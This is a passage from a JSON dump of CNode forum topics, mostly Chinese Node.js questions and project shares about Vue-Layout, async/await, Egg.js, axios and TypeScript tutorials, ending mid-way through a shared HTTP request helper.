src=\"https://raw.githubusercontent.com/jaweii/Vue-Layout/master/docs/images/App%20Bar1.png\" alt=\"此处输入图片的描述\"></li>\n</ol>\n<p>主要就是修改红框部分的内容，attributes和slots参照UI文档的API，template改成对应组件的标签名，当然每个UI、每个组件都不同，有的只需要稍作修改，有的则需要改很多。\n每次属性视图上触发的属性更新，都会让handle函数执行一遍，并传入新的属性、嵌套以及组件的信息，然后返回拼凑的新模板，重新挂载到预览视图。<strong>属性可视化编辑的功能就是这么实现的。</strong></p>\n<ol>\n<li>\n<p>Header.js完成后，在<code>./src/components/template/Mint-UI/index.js</code>中引入，\n<img src=\"https://raw.githubusercontent.com/jaweii/Vue-Layout/master/docs/images/Header%201.png\" alt=\"此处输入图片的描述\"><br>\n图中的键名的写法，是因为有的键名包含空格，比如&quot;App Bar&quot;。为了直观和便于维护，命名都是与UI官方文档相同。</p>\n</li>\n<li>\n<p>再将添加的Header组件添加到组件列表视图即可。</p>\n</li>\n</ol>\n<blockquote></blockquote>\n<pre class=\"prettyprint\"><code>            &lt;li draggable=&quot;true&quot; @dragstart=&quot;dragStart&quot; data-name=&quot;Header&quot;&gt;\n                &lt;mt-header fixed title=&quot;Header&quot;&gt;&lt;&#x2F;mt-header&gt;\n            &lt;&#x2F;li&gt;\n</code></pre><p>li标签包裹的元素，就是显示在组件列表视图的元素，其中li的data-name的值必须与上一步骤中保存的键名相同。</p>\n<ol>\n<li>对于新增的UI，最后在<code>./src/components/template/index.js</code>中，添加类似下图这样的方法就可以了：<br>\n<img src=\"https://raw.githubusercontent.com/jaweii/Vue-Layout/master/docs/images/getTemplte.png\" alt=\"此处输入图片的描述\"></li>\n</ol>\n<p>到此，一个mint-ui导航栏组件的可视化就拓展完成了。</p>\n<p>完结，撒花。</p>\n<h2>最后</h2>\n<p>项目没有使用eslint，使用的格式化插件：<a href=\"https://packagecontrol.io/packages/HTML-CSS-JS%20Prettify\">https://packagecontrol.io/packages/HTML-CSS-JS Prettify</a><br>\n（默认配置，仅在配置项的格式化文件类型中增加了.vue格式）。</p>\n<p>欢迎道友们一起来让Vue-Layout支持跟多UI~</p>\n</div>","title":"Vue-Layout : vue可视化布局、自动生成代码","last_reply_at":"2019-01-13T13:24:19.257Z","good":false,"top":false,"reply_count":25,"visit_count":45556,"create_at":"2017-08-16T06:26:52.670Z","author":{"loginname":"jaweii","avatar_url":"https://avatars3.githubusercontent.com/u/22613580?v=4&s=120"}},{"id":"5c3b0a0a3898674067a7e969","author_id":"56cb313d66c88b5e490260a9","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FmBWBEqZwwVZzxx-vxuf1VVZ0oiv\" alt=\"image.png\"></p>\n</div>","title":"Facebook的彩色背景文字帖子很不错，有没有开源的学习一下？","last_reply_at":"2019-01-13T09:51:06.578Z","good":false,"top":false,"reply_count":0,"visit_count":633,"create_at":"2019-01-13T09:51:06.578Z","author":{"loginname":"awong1900","avatar_url":"https://avatars1.githubusercontent.com/u/4022612?v=4&s=120"}},{"id":"5c3b02c93898674067a7e93b","author_id":"579daf3285dba6b12ac5856e","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://moodz.minghe.me/\">https://moodz.minghe.me/</a></p>\n<p>经过几个周末的迭代，”轻巧日记“ 小程序算是完成了, 感谢在早期就尝试使用的近一千位朋友。现在 轻巧日记 基本功能已经稳定。\n它的核心功能依然不变:</p>\n<ul>\n<li>你可以花几秒来简单记录 (只包含心情和活动标签) 你的一天.</li>\n<li>你也可以花几分钟完成一篇丰富的小日记.</li>\n</ul>\n<p>下面是几个使用截图:</p>\n<ul>\n<li>记录心情</li>\n</ul>\n<p><img src=\"//static.cnodejs.org/FjvUY6m83-EmNfJITq3NOAVDxrKW\" alt=\"3.5-inch (iPhone4)-Screenshot1.png\"></p>\n<ul>\n<li>\n<p>日记撰写\n<img src=\"//static.cnodejs.org/FsyVZ4WZOz1nvTatbx7LBurYEmVN\" alt=\"3.5-inch (iPhone4)-Screenshot1.png\"></p>\n</li>\n<li>\n<p>简单统计</p>\n</li>\n</ul>\n<p><img src=\"//static.cnodejs.org/FmmPLHld04mEY94gkF9vyFw4srNL\" alt=\"3.5-inch (iPhone4)-Screenshot1.png\"></p>\n<ul>\n<li>扫码开始使用吧</li>\n</ul>\n<p><img src=\"//static.cnodejs.org/FkmEy6uEoXfcANxtyrmH2D28NR98\" alt=\"qr.jpg\"></p>\n</div>","title":"微信日记小程序: 碎片化时间来写篇小日记","last_reply_at":"2019-01-13T09:20:09.858Z","good":false,"top":false,"reply_count":0,"visit_count":695,"create_at":"2019-01-13T09:20:09.858Z","author":{"loginname":"metrue","avatar_url":"https://avatars2.githubusercontent.com/u/1001246?v=4&s=120"}},{"id":"5c39a4033898674067a7e676","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>之前发过一个帖子,new Promise 和 async是否可以混用,论坛2位朋友给出了很详细的解释,再次感谢2位朋友,楼主本身是萌新选手,想确认一下如下写法应该是没问题的吧?怕自己理解错了…</p>\n<pre class=\"prettyprint language-js\\n\"><code>\t&#x2F;&#x2F;下面函数test返回promise对象,使用的时候 await myTest.test(key, value, ttl)\n\ttest: async function(key, value, ttl){\n            try {\n                let ttlRe = await redisClient.redisGetTTL(key)\n                &#x2F;&#x2F; here，你的代码备注！\n                if (ttlRe.message != -1 &amp;&amp; ttlRe.message != -2 &amp;&amp; ttlRe) {\n                    return ({a: ttlRe});\n                }\n                console.log(&#x27;过期重新生成:&#x27; + ttl)\n                let zz = await redisClient.redisKeySet(key, value, ttl)\n                return ({a: &#x27;过期重新生成&#x27;})\n            } catch (err) {\n                console.log(&#x27;出错了:&#x27; + err)\n                throw err\n            }\n    } \\n&#96;&#96;&#96; 标记代码块</code></pre></div>","title":"麻烦帮看async和await混写的写法对不对?","last_reply_at":"2019-01-13T07:00:19.535Z","good":false,"top":false,"reply_count":2,"visit_count":662,"create_at":"2019-01-12T08:23:31.179Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c3acdf93898674067a7e8a2","author_id":"5a72ca56ce45d440451465c6","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FpD8IzBOajVAqV0feciWzFIf7WSO\" alt=\"1.png\">\n如图，\nnode版本: v8.11.0\n谷歌了一通，没找到解决办法，有老哥知道吗</p>\n</div>","title":"mysql模块报错:Error: Handshake inactivity timeout","last_reply_at":"2019-01-13T05:34:49.718Z","good":false,"top":false,"reply_count":0,"visit_count":607,"create_at":"2019-01-13T05:34:49.718Z","author":{"loginname":"heguangda","avatar_url":"https://avatars1.githubusercontent.com/u/29668335?v=4&s=120"}},{"id":"5c34996a5bf06c5e7e3f2cac","author_id":"5c34991b5bf06c5e7e3f2ca3","tab":"ask","content":"<div class=\"markdown-text\"><p>哪位大神用过腾讯云的vod模块啊，小弟被他们的文档和接口搞死了啊。请大神出来指导一下</p>\n</div>","title":"请教腾讯云vod视频模块相关问题","last_reply_at":"2019-01-13T05:01:00.180Z","good":false,"top":false,"reply_count":4,"visit_count":653,"create_at":"2019-01-08T12:36:58.798Z","author":{"loginname":"heyonghappy","avatar_url":"https://avatars3.githubusercontent.com/u/19277925?v=4&s=120"}},{"id":"5c39dab0a4d44449266b027c","author_id":"57f2384783a4d9176a71da75","tab":"ask","content":"<div class=\"markdown-text\"><h3>问题描述</h3>\n<p>我直接使用 <code>egg-init egg-example --type=simple</code> 创建的项目，在 Heroku 上运行会 crash 掉。\n之前纠结是不是自己写的代码的问题，但是跑了 example 也还是挂掉。</p>\n<h3>更新</h3>\n<p>问题已解决，需要删除<code>package.json</code> 中 <code>start</code> 命令的 \t <code>--deamon</code> 。</p>\n<h3>参考文章</h3>\n<p><a href=\"https://blog.sundaycoding.com/blog/2015/11/05/heroku-process-exited-with-status-0/\">https://blog.sundaycoding.com/blog/2015/11/05/heroku-process-exited-with-status-0/</a></p>\n</div>","title":"Egg.js 在 Heroku 上的 process exited with status 0 问题的解决方案","last_reply_at":"2019-01-12T12:16:48.361Z","good":false,"top":false,"reply_count":0,"visit_count":536,"create_at":"2019-01-12T12:16:48.361Z","author":{"loginname":"bestony","avatar_url":"https://avatars1.githubusercontent.com/u/13283837?v=4&s=120"}},{"id":"5c370e245bf06c5e7e3f3c62","author_id":"516cc5936d382773065b8e2f","tab":"share","content":"<div class=\"markdown-text\"><p>最近用 <code>axios</code> 做一个小爬虫项目, 顺带扩展了一下 <code>axios</code> , 支持重试和并发控制.\n用 <code>Proxy</code> 对像拦截所有请求函数, 将请求先插入到一个基于 <code>Promise</code> 队列中\n这样的好处是 不用了解修改 <code>axios</code> 内部实现</p>\n<blockquote>\n<p>由于用了 <code>Proxy</code> , 兼容要小心了, 因为没有对应的 polyfill</p>\n</blockquote>\n<p><strong>和使用 <code>axios</code> 一毛一样 , 但并发控制和重试机制确生效了.</strong></p>\n<pre class=\"prettyprint language-js\"><code>const axios = require(&#x27;axios-extra&#x27;); &#x2F;&#x2F;默认最大并发 10, 重试 0;\naxios.defaults.maxConcurrent = 1; &#x2F;&#x2F;修改axios&#96;并发为1\n&#x2F;&#x2F; 创建一个 axios1 并发为2, 自动重试为3的 axios;\nlet axios1 = axios.create({ \n\tmaxConcurrent: 2,\n\tqueueOptions: { retry:3\t}\n});\n\nfor(let i=0; i&lt;10; i++){\n\taxios.get(&#x27;https:&#x2F;&#x2F;cnodejs.org&#x2F;api&#x2F;v1&#x2F;topics&#x27;).then((res)=&gt;{\n\t\tconsole.log( &#x27;axios1&#x27;, i , res.data.data.length);\n\t});\n\taxios1.get(&#x27;https:&#x2F;&#x2F;cnodejs.org&#x2F;api&#x2F;v1&#x2F;topics&#x27;).then((res)=&gt;{\n\t\tconsole.log( &#x27;axios1&#x27;,  i , res.data.data.length);\n\t})\n}\n</code></pre><p>己经发到 npm  可以 <code>npm i axios-extra</code> 体验一下;<br>\nGithub 地址 <a href=\"https://github.com/cnwhy/axios-extra\">axios-extra</a></p>\n</div>","title":"用 Proxy 扩展 axios , 让它支持并发控制与出错重试","last_reply_at":"2019-01-11T14:45:59.529Z","good":false,"top":false,"reply_count":3,"visit_count":873,"create_at":"2019-01-10T09:19:32.414Z","author":{"loginname":"cnwhy","avatar_url":"https://avatars1.githubusercontent.com/u/4178465?v=4&s=120"}},{"id":"58cd118bede0d3f7168541ef","author_id":"58773011c4f5cf7619671335","tab":"share","content":"<div class=\"markdown-text\"><p>CNode PWA 是使用 React，React Router 和 Redux 构建的 Progressive Web App。</p>\n<h3>安装</h3>\n<p>为了解决前端路由的问题，从 GitHub Pages 迁移到了 Surge，之前添加到主屏幕的需要重新添加一下：</p>\n<p><a href=\"https://cnode.surge.sh\">https://cnode.surge.sh</a></p>\n<p>移动设备可以扫码访问：\n<img src=\"//static.cnodejs.org/FvgQzdpmQkKeFf1kQvW9piBFfXmd\" alt=\"1490539307.png\"></p>\n<p>首次加载可能会比较慢。</p>\n<h4>Android</h4>\n<p>安装 Google Chrome 浏览器，访问链接，点击右上角图标，选择“添加到主屏幕”。有了 service worker 的加持，拥有首屏图片，离线访问等能力。</p>\n<h4>iOS</h4>\n<p>使用 Safari 浏览器访问链接，点击下方正中央的图标，选择“添加到主屏幕”。目前 iOS Safari 不支持 service worker，所以没有离线访问的能力。</p>\n<h3>源代码</h3>\n<p><a href=\"https://github.com/pd4d10/cnode-pwa\">https://github.com/pd4d10/cnode-pwa</a></p>\n<p>第一版做得比较糙，功能有限（目前只有看贴功能，发贴等功能还在开发中）。欢迎提交 issue 和 pull request。</p>\n<h2>屏幕截图</h2>\n<p><img src=\"//static.cnodejs.org/FqOKZEqbgLoI7-bsDrPHhNKbx8zH\" alt></p>\n<p><img src=\"//static.cnodejs.org/FgY38gthb6z-BNMkV_dWOPROPxeV\" alt></p>\n</div>","title":"Progressive Web App（PWA）版本的 CNode 社区","last_reply_at":"2019-01-11T12:25:56.734Z","good":false,"top":false,"reply_count":14,"visit_count":4913,"create_at":"2017-03-18T10:52:59.043Z","author":{"loginname":"pd4d10","avatar_url":"https://avatars0.githubusercontent.com/u/9524411?v=4&s=120"}},{"id":"5c3880be3898674067a7e39e","author_id":"558679e901d3ce0d73d68ffc","tab":"ask","content":"<div class=\"markdown-text\"><p>要接入 <a href=\"https://github.com/eggjs/egg-sls\">egg-sls</a>，需要配置三个环境变量：</p>\n<pre class=\"prettyprint\"><code>  &#x2F;&#x2F; client: {\n  &#x2F;&#x2F;   endpoint: &#x27;&#x27;,\n  &#x2F;&#x2F;   accessKeyId: &#x27;&#x27;,\n  &#x2F;&#x2F;   accessKeySecret: &#x27;&#x27;,\n  &#x2F;&#x2F; },\n</code></pre><p>accessKeyId 和 accessKeySecret 可以在 <a href=\"https://usercenter.console.aliyun.com/\">https://usercenter.console.aliyun.com/</a> 看到，但是 endpoints 应该从哪里查呢？</p>\n</div>","title":"阿里云日志平台的 endpoint 在哪里查看？","last_reply_at":"2019-01-11T11:57:07.464Z","good":false,"top":false,"reply_count":1,"visit_count":406,"create_at":"2019-01-11T11:40:46.976Z","author":{"loginname":"Jeff-Tian","avatar_url":"https://avatars2.githubusercontent.com/u/3367820?v=4&s=120"}},{"id":"5c3723f25bf06c5e7e3f3d01","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>求教,new Promise 和 async可以混用么?需求是要把多个await封装成一个新的功能,方便外部调用使用,像下面这样调用有什么隐患么?如果能用,哪种方式好?(上传不了图片,一上传谷歌浏览器就崩溃)</p>\n<pre class=\"prettyprint language-js\\n\"><code>方式一:async写在new promise括号里\n    return new Promise(async(resolve, reject) =&gt; {\n                try {\n                    let ttlRe = await redisApply.redisGetTTL(key);\n                    if (ttlRe.message == -1 || ttlRe.message == -2 || !ttlRe) {\n                        console.log(&#x27;过期重新生成:&#x27; + ttl)\n                        let zz = await redisApply.redisKeySet(key, value, ttl)\n                        resolve({a: zz});\n                    }else {\n                        resolve({a: &#x27;s&#x27;});\n                    }\n                } catch (err) {\n                    console.log(&#x27;出错了:&#x27; + err);\n                    reject(err);\n                }\n        });\n\n方式二:async写在代码里\n&#96;&#96;&#96;js\\n\n\t return new Promise((resolve, reject) =&gt; {\n            (async () =&gt; {\n                try {\n                    let ttlRe = await redisApply.redisGetTTL(key);\n                    if (ttlRe.message == -1 || ttlRe.message == -2 || !ttlRe) {\n                        console.log(&#x27;过期重新生成:&#x27; + ttl)\n                        let zz = await redisApply.redisKeySet(key, value, ttl)\n                        resolve({a: zz});\n                    } else {\n                        resolve({a: &#x27;s&#x27;});\n                    }\n                } catch (err) {\n                    console.log(&#x27;出错了:&#x27; + err);\n                    reject(err);\n                }\n            })();\n        })\n    }</code></pre></div>","title":"求教:new Promise 和 async可以混用么?","last_reply_at":"2019-01-11T09:47:12.153Z","good":false,"top":false,"reply_count":7,"visit_count":813,"create_at":"2019-01-10T10:52:34.623Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c38497ca4d44449266afcd6","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>掘金编辑器能实时自动保存，这样不会给服务器带来巨大压力？请问下用了什么样的技术点呢~~</p>\n</div>","title":"请问下编辑器中实时自动保存，用了什么技术~~","last_reply_at":"2019-01-11T09:22:06.293Z","good":false,"top":false,"reply_count":3,"visit_count":654,"create_at":"2019-01-11T07:45:00.694Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c382b88a4d44449266afb74","author_id":"5b1d495729e6e510415b29b0","tab":"ask","content":"<div class=\"markdown-text\"><p>有大佬之前做过这样的需求吗？求指点。。我试了fs.createReadstream来读取文件，直接插入数据库，但是不行。</p>\n</div>","title":"node如何将文件变成二进制流插入mysql的longblob？？？","last_reply_at":"2019-01-11T07:51:22.794Z","good":false,"top":false,"reply_count":2,"visit_count":521,"create_at":"2019-01-11T05:37:12.198Z","author":{"loginname":"helloHT","avatar_url":"https://avatars3.githubusercontent.com/u/31006740?v=4&s=120"}},{"id":"5c36f1353898674067a7d972","author_id":"5c024ab7887c5864fafe1804","tab":"ask","content":"<div class=\"markdown-text\"><p>同步完没有改变，\n是不是必须要手动重启</p>\n</div>","title":"使用webstrom同步本地egg代码到服务器的问题","last_reply_at":"2019-01-11T03:42:22.675Z","good":false,"top":false,"reply_count":5,"visit_count":614,"create_at":"2019-01-10T07:16:05.033Z","author":{"loginname":"1124219777","avatar_url":"https://avatars2.githubusercontent.com/u/17058939?v=4&s=120"}},{"id":"5c1ce5c576c4964062a1c60f","author_id":"5b52cbf1fb9e84ec69cc1ca2","tab":"ask","content":"<div class=\"markdown-text\"><p>egg.js中的自定义模块放在什么目录比较好?  公司内部用的模块。直接引入就可以用了。但是不知道放在什么目录比较好</p>\n</div>","title":"egg.js中的自定义模块放在什么目录比较好？","last_reply_at":"2019-01-11T02:11:40.772Z","good":false,"top":false,"reply_count":5,"visit_count":791,"create_at":"2018-12-21T13:08:21.859Z","author":{"loginname":"nodeper","avatar_url":"https://avatars2.githubusercontent.com/u/41500847?v=4&s=120"}},{"id":"5c3756e63898674067a7dd63","author_id":"58400cd63aa1310a5786878f","tab":"share","content":"<div class=\"markdown-text\"><h2>诱人的 TypeScript 视频教程（24 个视频）</h2>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-1-jie-shao\">诱人的 TypeScript 视频教程 #1 介绍</a>「06:26」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-2-wei-shen-me-yao-yong-typescript\">诱人的 TypeScript 视频教程 #2 为什么要用 TypeScript</a>「14:08」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-3-an-zhuang-typescript\">诱人的 TypeScript 视频教程 #3 安装 TypeScript</a>「04:54」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-4-lei-xing-ding-yi\">诱人的 TypeScript 视频教程 #4 类型定义</a>「05:57」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-5-var\">诱人的 TypeScript 视频教程 #5 var、let、const</a>「Pro」「12:15」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-6-shu-zu-array\">诱人的 TypeScript 视频教程 #6 数组 - Array</a>「Pro」「08:03」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-7-yuan-zu-tuple\">诱人的 TypeScript 视频教程 #7 元组 - Tuple</a>「Pro」「04:59」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-8-han-shu-function-arrow-function\">诱人的 TypeScript 视频教程 #8 函数 - Function - Arrow Function</a>「Pro」「05:53」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-9-han-shu-fan-hui-zhi-lei-xing-void\">诱人的 TypeScript 视频教程 #9 函数返回值类型 - void</a>「Pro」「05:35」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-10-han-shu-mo-ren-can-shu-he-ke-xuan-can-shu\">诱人的 TypeScript 视频教程 #10 函数 - 默认参数和可选参数</a>「Pro」「08:27」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-11-han-shu-rest-parameters\">诱人的 TypeScript 视频教程 #11 函数 - Rest Parameters</a>「Pro」「06:21」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-12-ren-yi-lei-xing-any\">诱人的 TypeScript 视频教程 #12 任意类型 - any</a>「Pro」「07:14」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-13-lian-he-lei-xing-union-type\">诱人的 TypeScript 视频教程 #13 联合类型 - union type、null、undefined</a>「Pro」「08:55」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-14-lei-mian-xiang-dui-xiang-class-jie-shao\">诱人的 TypeScript 视频教程 #14 类 - 面向对象 - class 介绍</a>「Pro」「09:37」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-15-mian-xiang-dui-xiang-lei-gou-zao-fang-fa-constructor-fang-fa-methods\">诱人的 TypeScript 视频教程 #15 面向对象 - 类 - 构造方法（constructor）- 方法（methods）</a>「Pro」「11:46」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-16-mian-xiang-dui-xiang-ji-cheng-he-duo-tai-inheritance-and-polymorphism\">诱人的 TypeScript 视频教程 #16 面向对象 - 继承和多态 - Inheritance and Polymorphism</a>「Pro」「13:10」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-17-mian-xiang-dui-xiang-cheng-yuan-ke-jian-xing-member-visibility-public-he-private\">诱人的 TypeScript 视频教程 #17 面向对象 - 成员可见性 - Member visibility - public 和 private</a>「Pro」「15:22」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-18-mian-xiang-dui-xiang-cheng-yuan-ke-jian-xing-member-visibility-shen-ru-jie-xi-private-he-protected-de-yi-tong\">诱人的 TypeScript 视频教程 #18 面向对象 - 成员可见性 - Member visibility - 深入解析 private 和 protected 的异同</a>「Pro」「22:55」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-19-mian-xiang-dui-xiang-cheng-yuan-ke-jian-xing-member-visibility-shen-ru-tan-suo-constructor\">诱人的 TypeScript 视频教程 #19 面向对象 - 成员可见性 - Member visibility - 深入探索 constructor</a>「Pro」「10:24」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-20-mian-xiang-dui-xiang-jing-tai-shu-xing-he-fang-fa-static-shen-ru-tan-suo-cheng-yuan-ke-jian-xing\">诱人的 TypeScript 视频教程 #20 面向对象 - 静态属性和方法 - static - 深入探索成员可见性</a>「Pro」「16:12」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-21-mian-xiang-dui-xiang-zhi-du-shu-xing-readonly\">诱人的 TypeScript 视频教程 #21 面向对象 - 只读属性 - readonly</a>「Pro」「03:48」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-22-mei-ju-lei-xing-enum\">诱人的 TypeScript 视频教程 #22 枚举类型 - enum</a>「Pro」「07:22」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-23-nodemon-ts-node\">诱人的 TypeScript 视频教程 #23 nodemon 和 ts-node</a>「Pro」「05:30」</p>\n<p><a href=\"https://www.rails365.net/movies/you-ren-de-typescript-shi-pin-jiao-cheng-24-jie-kou-jie-shao-interfaces\">诱人的 TypeScript 视频教程 #24 接口介绍 - Interfaces</a>「Pro」「14:56」</p>\n</div>","title":"诱人的 TypeScript 视频教程（24 个视频）","last_reply_at":"2019-01-10T14:29:58.050Z","good":false,"top":false,"reply_count":0,"visit_count":715,"create_at":"2019-01-10T14:29:58.050Z","author":{"loginname":"yinsigan","avatar_url":"https://avatars2.githubusercontent.com/u/740643?v=4&s=120"}},{"id":"5554759a7cabb7b45ee6baa2","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><p>分享一个自己封装的方法：用nodejs充当客户端向服务器发起http或者https请求，高手请无视啦，哈哈：</p>\n<pre class=\"prettyprint\"><code>&#x2F;**\n * 提交http or https请求\n * these two examples below is ok!they return a equal result:\n * _commitHttpReq({url:&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd=nba&quot;,protocol:&quot;http&quot;},function(err,reply){console.log(reply);});\n * _commitHttpReq({url:&quot;http:&#x2F;&#x2F;www.baidu.com&#x2F;s&quot;,protocol:&quot;http&quot;,data:{wd:&quot;nba&quot;}},function(err,reply){console.log(reply);});\n * @param opt\n * {    host:&#x27;192.168.1.16&#x27;\n *      port: &#x27;8001&#x27; &#x2F;&#x2F;可不填，默认为80端口\n *      path: &#x27;&#x2F;someService&#x27; &#x2F;&#x2F;或者不填写host path两个属性，直接填写url属性，值为：&#x27;http:&#x2F;&#x2F;mis.migc.xiaomi.com&#x2F;api&#x2F;biz&#x2F;service&#x2F;verifySession.do&#x27;\n *      method: &#x27;post&#x27;\n * }\n * @param data 提交的数据，只支持一层结构的json对象(如{id:3,name:&quot;ss&quot;})，多层的话会出错，url的get请求不支持传多层结构的json对象(如{id:3,name:{first:&quot;a&quot;,last:&quot;b&quot;}})\n * @param protocol :http | https\n * @param cb\n *&#x2F;\n function _commitHttpReq(opt,cb) {\n\tvar url=require(&#x27;url&#x27;),querystring = require(&#x27;querystring&#x27;);\n\tfunction _wrapUrl(opt){\n\t\tvar err=null;\n\t\tif(opt.url){\n\t\t\tvar opt_protocol=opt.protocol;\n\t\t\tvar sub_protocol=opt.url.substr(0,5);\n\t\t\tif(sub_protocol==&quot;http:&quot;){\n\t\t\t\tif(opt_protocol){\n\t\t\t\t\tif(opt_protocol!=&quot;http&quot;)err=&quot;url&#x27;s protocol:http not equal option&#x27;s protocol:&quot;+opt_protocol;\n\t\t\t\t}else{\n\t\t\t\t\topt.protocol=&quot;http&quot;;\n\t\t\t\t}\n\t\t\t}else if(protocol==&quot;https&quot;){\n\t\t\t\tif(opt_protocol){\n\t\t\t\t\tif(opt_protocol!=&quot;https&quot;)err=&quot;url&#x27;s protocol:http not equal option&#x27;s protocol:&quot;+opt_protocol;\n\t\t\t\t}else{\n\t\t\t\t\topt.protocol=&quot;https&quot;;\n\t\t\t\t}\n\t\t\t}else if(sub_protocol.indexOf(&quot;www&quot;)!=-1){\n\t\t\t\tif(!opt_protocol)err=&quot;no protocol defined!&quot;;else opt.url=opt_protocol+&quot;:&#x2F;&#x2F;&quot;+opt.url;\n\t\t\t}else{\n\t\t\t\terr=&quot;url writing is invalid&quot;;\n\t\t\t}\n\t\t}\n\t\treturn err;\n\t}\n\tvar out_err=_wrapUrl(opt);\n\tif(out_err)return cb(out_err,null);\n\tvar protocol=opt.protocol;\n\tvar httpMgr = protocol == &quot;http&quot; ? require(&#x27;http&#x27;) : require(&#x27;https&#x27;);\n\n\t&#x2F;&#x2F;if opt.url like:&quot;https:&#x2F;&#x2F;www.beyourboss.com&#x2F;call%s.do?cmd=start&amp;st=%s&quot;\n\t&#x2F;&#x2F;var util = require(&#x27;util&#x27;);\n\t&#x2F;&#x2F;var _regUrl = util.format(opt.url, &#x27;param1&#x27;, &#x27;param2&#x27;);&#x2F;&#x2F;替换掉两个%s占位符\n\n\tvar method=opt.method?opt.method:&#x27;get&#x27;;\n\tvar port=opt.port?opt.port:80;\n\tvar params = &#x27;&#x27;;\n\tif(opt.data)params+=querystring.stringify(opt.data);\n\tif(opt.url){\n\t\tif(method==&quot;get&quot; &amp;&amp; params.length&gt;0){\n\t\t\topt.url+=(&quot;?&quot;+params);\n\t\t}\n\t\tvar options = url.parse(opt.url);\n\t\toptions.method = method;\n\t\toptions.port = port;\n\t\t&#x2F;&#x2F;console.log(&quot;url:&quot;+opt.url);\n\t}else{\n\t\tvar options = {\n\t\t\thost: opt.host,\n\t\t\tport: port,\n\t\t\tpath: opt.path,&#x2F;&#x2F;形如：&quot;&#x2F;callSomething.do&quot;\n\t\t\tmethod: method\n\t\t};\n\t}\n\t&#x2F;&#x2F;console.log(params);\n\toptions.headers = {\n\t\t&#x27;Content-Type&#x27;: &#x27;application&#x2F;x-www-form-urlencoded&#x27;,\n\t\t&#x27;Content-Length&#x27; : params.length\n\t};\n\t&#x2F;&#x2F;if need cookie,example: options.headers.cookie=&#x27;a=b;c=d;&#x27;,\n\tvar req = httpMgr.request(options, function (res) {\n\t\tconsole.log(&#x27;STATUS: &#x27; + res.statusCode);\n\t\t&#x2F;&#x2F;console.log(res);\n\t\tconsole.log(&#x27;HEADERS: &#x27; + JSON.stringify(res.headers));\n\t\tres.setEncoding(&#x27;utf8&#x27;);&#x2F;&#x2F;设置字符编码\n\t\tvar _data=&quot;&quot;;&#x2F;&#x2F;返回数据流\n\t\tres.on(&#x27;data&#x27;, function (chunk) {&#x2F;&#x2F;数据\n\t\t\t_data+=chunk;\n\t\t});\n\t\t&#x2F;&#x2F; 结束回调\n\t\tres.on(&#x27;end&#x27;, function(){\n\t\t\tcb(null,_data);\n\t\t});\n\t\treq.on(&#x27;error&#x27;, function(e) 